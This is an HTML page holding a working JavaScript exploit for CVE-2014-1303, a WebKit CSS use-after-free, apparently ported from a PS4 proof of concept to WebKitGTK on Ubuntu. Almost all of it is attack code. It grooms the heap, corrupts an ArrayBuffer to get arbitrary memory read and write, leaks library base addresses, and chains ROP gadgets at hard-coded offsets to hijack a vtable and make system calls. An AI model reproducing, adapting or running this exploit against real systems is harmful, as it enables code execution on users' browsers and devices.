<html>
<style>html, a1,a2,a3,a4,a5,a6 em:nth-child(5){
    height: 500px
}
</style>

<script>
/*
 * Author: Ren Kimura (@RKX1209)
 * Tested to work on up to date Ubuntu 14.04.
 * NOTE: Original PS4 exploit is here.
 *       https://github.com/Fire30/PS4-2014-1303-POC
 */
var shui = new Array(0x1000);
var inputs = new Array(0x500);
var arraybufferviews = new Array(0x500);
var corrupted = undefined;
var u32;
var cbuf;

var rop_chain = [];

var js_core_base_addr;
var webkitgtk_base_addr;
var libc_base_addr;
var bss_addr;

var js_core_base_addr_low, js_core_base_addr_high;
var webkitgtk_base_addr_low, webkitgtk_base_addr_high;
var libc_base_addr_low, libc_base_addr_high;
var bss_addr_low, bss_addr_high;

function load() {
  // Align the memory how we want it
  for(var i = 0; i < shui.length;i+=2)
  {
      inputs[i/2] =  document.createElement("input");
      inputs[i/2].type = "number";
      shui[i] = new ArrayBuffer(0x40);
      shui[i + 1] = new ArrayBuffer(0x20000);
  }
  // Trigger the vulnrablity.
  var cssRules = window.getMatchedCSSRules(document.documentElement);
  cssRules[0].selectorText = 'a1,a2';
  // Free the input elements and put in our ArrayBufferView objects
  for(var i = 0; i < inputs.length;i+=1)
  {
        inputs[i].type = "";
        arraybufferviews[i] = new Uint32Array(shui[i/2]);
        // Need a value to find in memory
        arraybufferviews[i][0] = 0x77777777;
  }
  // Start the actual exploit
  setTimeout(exploit_init, 0);
}

function exploit_init()
{
  // Find the ArrayBuffer that has had it size modified
  for (var i = 0; i < shui.length; ++i) {
      if (shui[i].byteLength == 0xc0) {
          corrupted = shui[i];
          debug_log("Found corrupted index at 0x" + i.toString(16));
          console.log("Found corrupted index at 0x" + i.toString(16));
          break;
      }
  }
  // If we find nothing, crash the application.
  // Shouldn't happen based on how tcmalloc allocates memory
  if(!corrupted)
  {
    debug_log("Couldn't find corrupted element...!")
    console.log("Couldn't find corrupted element...!")
    return;
  }
  u32 = new Uint32Array(corrupted);
  // Need to find the ArrayBufferView that we have control over
  u32[0x18] += 0x10;
  for(var i = 0; i < arraybufferviews.length;i++)
  {
      tmp_array = arraybufferviews[i].subarray(0,arraybufferviews[i].length);
      if(tmp_array[0] != 0x77777777 && arraybufferviews[i].length > 0x40)
      {
        cbuf = arraybufferviews[i];
        u32[0x18] -= 0x10;
        debug_log("Found controlled arraybufferview!")
        console.log("Found controlled arraybufferview!")
        break;
      }
  }
  // Need to keep track of where the buffer is
  oldlow = u32[0x14]
  oldhigh = u32[0x15]
  // Various calculations to get the base addresses of libraries that we use gadgets for
  // Javascript is stupid and doesn't support 64bit integers so we need to use 3rd party lib
  var vtable_addr = new dcodeIO.Long(u32[0x10], u32[0x11], true)
  js_core_base_addr = vtable_addr.sub(0x3d4ff90);  //libjavascriptcoregtk.so
  webkitgtk_base_addr = js_core_base_addr.add(0x22ee000); //libwebkitgtk.so
  libc_base_addr = js_core_base_addr.add(0x766000); //libc-2.19.so
  bss_addr = new dcodeIO.Long(0x607450, 0, true); // readelf -S ./Programs/GtkLauncher

  js_core_base_addr_low = js_core_base_addr.getLowBitsUnsigned()
  js_core_base_addr_high = js_core_base_addr.getHighBitsUnsigned()
  webkitgtk_base_addr_low = webkitgtk_base_addr.getLowBitsUnsigned()
  webkitgtk_base_addr_high = webkitgtk_base_addr.getHighBitsUnsigned()
  libc_base_addr_low = libc_base_addr.getLowBitsUnsigned()
  libc_base_addr_high = libc_base_addr.getHighBitsUnsigned()
  bss_addr_low = bss_addr.getLowBitsUnsigned()
  bss_addr_high = bss_addr.getHighBitsUnsigned()
  debug_log("vtable address = 0x" + vtable_addr.toString(16))
  debug_log("libjavascriptcore base address = 0x" + js_core_base_addr.toString(16))
  debug_log("webkitgtk base address = 0x" + webkitgtk_base_addr.toString(16))
  debug_log("libc base address = 0x" + libc_base_addr.toString(16))
  // vtable pointer to byteLength
  // The instruction pushes rax, and jmps to *rax
  // gadget: push rax; jmp qword [rax]
  cbuf[2] = webkitgtk_base_addr_low + 0x497a
  cbuf[3] = webkitgtk_base_addr_high
  // *rax is the first element in our array.
  // pop rsp then jmps to *(rax + 0x30)
  // gadget: pop rsp ; mov rax, qword [rax+0x30] ; jmp rax
  cbuf[0] = webkitgtk_base_addr_low + 0xa2cd52
  cbuf[1] = webkitgtk_base_addr_high
  // adds 0x48 to rsp
  // so stack pointer will point to cbuf[0x12]
  cbuf[0xc] = webkitgtk_base_addr_low + 0x40aefc
  cbuf[0xd] = webkitgtk_base_addr_high

  // rbp is invalid address. So, firstly changed it to valid address.
  // pop rbp ; ret
  rop_chain.push (webkitgtk_base_addr_low + 0x1f0709)
  rop_chain.push (webkitgtk_base_addr_high)
  rop_chain.push (bss_addr_low + 0x1000)
  rop_chain.push (bss_addr_high)
  debug_log("Initilization completed.")
}

function inject_ropcode(rop_chain)
{
  //rop chain starts at the index of 0x12 in cbuf
  for(var i = 0; i < rop_chain.length; i++)
    cbuf[0x12 + i] = rop_chain[i]
  debug_log ("Writing ROP chain completed!")
}

// Gadget offsets from libwebkitgtk
var offset_pop_rax = 0x72a20;    //pop rax ; ret
var offset_pop_rdi = 0x3c9660;   //pop rdi ; ret
var offset_pop_rsi = 0x3c943a;   //pop rsi ; ret
var offset_pop_rdx = 0x6fdc0;    //pop rdx ; ret
var offset_pop_r10 = 0x5fd44f;   //pop r10 ; ret
var offset_pop_r8 = 0x3d9b22;    //pop r8  ; ret
var offset_pop_r9 = 0x5fd67f;    //pop r9  ; ret

// Create syscall chain
function syscall(name, syscall_number, arg1, arg2, arg3, arg4, arg5, arg7)
{
  debug_log("syscall " + name)
  rop_chain.push(webkitgtk_base_addr_low + offset_pop_rax)
  rop_chain.push(webkitgtk_base_addr_high)
  rop_chain.push(syscall_number)
  rop_chain.push(0x0)
  if(typeof(arg1) !== "undefined")
  {
    rop_chain.push(webkitgtk_base_addr_low + offset_pop_rdi)
    rop_chain.push(webkitgtk_base_addr_high)
    rop_chain.push(arg1.getLowBitsUnsigned())
    rop_chain.push(arg1.getHighBitsUnsigned())
  }
  if(typeof(arg2) !== "undefined")
  {
    rop_chain.push(webkitgtk_base_addr_low + offset_pop_rsi)
    rop_chain.push(webkitgtk_base_addr_high)
    rop_chain.push(arg2.getLowBitsUnsigned())
    rop_chain.push(arg2.getHighBitsUnsigned())
  }
  if(typeof(arg3) !== "undefined")
  {
    rop_chain.push(webkitgtk_base_addr_low + offset_pop_rdx)
    rop_chain.push(webkitgtk_base_addr_high)
    rop_chain.push(arg3.getLowBitsUnsigned())
    rop_chain.push(arg3.getHighBitsUnsigned())
  }
  if(typeof(arg4) !== "undefined")
  {
    rop_chain.push(webkitgtk_base_addr_low + offset_pop_r10)
    rop_chain.push(webkitgtk_base_addr_high)
    rop_chain.push(arg4.getLowBitsUnsigned())
    rop_chain.push(arg4.getHighBitsUnsigned())
  }
  // syscall ; ret ;
  rop_chain.push(libc_base_addr_low + 0xc5c55)
  rop_chain.push(libc_base_addr_high);
}

// Dump [addr, addr + size)
function rawdump(addr, size)
{
  //In WebKit, fd1 == output of current /dev/pts/
  nr_write = 1
  fd = new dcodeIO.Long(1, 0, true)
  syscall("write", nr_write, fd, addr, size)
}

function crash_rop()
{
  debug_log("Overwriting vtable and executing Crash ROP chain!")
  // Make the u32 ArrayBufferView::vtable point to our buffer(pointed by u32.m_baseAddress)
  // i.e. u32.vtable = u32.m_baseAddress (jump to buf)
  u32[0x10] = u32[0x14];
  u32[0x11] = u32[0x15];

  // Write the rop chain to the buffer
  rop_chain.push(0xdeadbeef)
  rop_chain.push(0xdeadbeef)
  inject_ropcode(rop_chain)
  // Starts execution of our rop chain (call vtable)
  cbuf.byteLength; // call *0x8(%rax) => firstly jump to cbuf[2]
}

function get_pid()
{
  debug_log("Get PID")
  u32[0x10] = u32[0x14];
  u32[0x11] = u32[0x15];

  var nr_getpid = 39

  syscall("getpid", nr_getpid)
  // rax == current pid
  // dump rax value

  // pop rdx ; ret ;
  rop_chain.push(webkitgtk_base_addr_low + offset_pop_rdx)
  rop_chain.push(webkitgtk_base_addr_high)
  rop_chain.push(bss_addr_low)
  rop_chain.push(bss_addr_high)

  // rdx == bss
  // mov qword [rdx], rax ; ret ;
  rop_chain.push(webkitgtk_base_addr_low + 0x476f2d)
  rop_chain.push(webkitgtk_base_addr_high)

  // Finally dump 8 byte from [rdx](== rax) value
  rawdump(bss_addr, new dcodeIO.Long(8, 0, true))

  inject_ropcode(rop_chain)
  cbuf.byteLength; // call *0x8(%rax) => firstly jump to cbuf[2]
}

function dump_module()
{
  debug_log("Dumping module!")
  u32[0x10] = u32[0x14];
  u32[0x11] = u32[0x15];

  inject_ropcode(rop_chain)
  // Starts execution of our rop chain (call vtable)
  cbuf.byteLength; // call *0x8(%rax) => firstly jump to cbuf[2]

}
// read8 and write8 taken from Liang Chen's presentation on CVE 2014-1303
function read8(addr_low,addr_high)
{
  u32[0x14] = addr_low;
  u32[0x15] = addr_high;
  var result = [cbuf[0],cbuf[1]];
  u32[0x14] = oldlow;
  u32[0x15] = oldhigh;
  return result;
}
function write8(addr_low,addr_high,value_low,value_high)
{
  u32[0x14] = addr_low;
  u32[0x15] = addr_high;
  cbuf[0] = value_low;
  cbuf[1] = value_high;
  u32[0x14] = oldlow;
  u32[0x15] = oldhigh;
  return;
}
</script>
<script src="/scripts/jquery.min.js"></script>
<script src="/scripts/long.js"></script>
<script src="/scripts/utils.js"></script>
<a href="javascript:crash_rop()">Crash ROP</a>
<a href="javascript:get_pid()">Get PID</a>
<a href="javascript:dump_module()">Dump Module</a>
<iframe onload=load()>
</html>
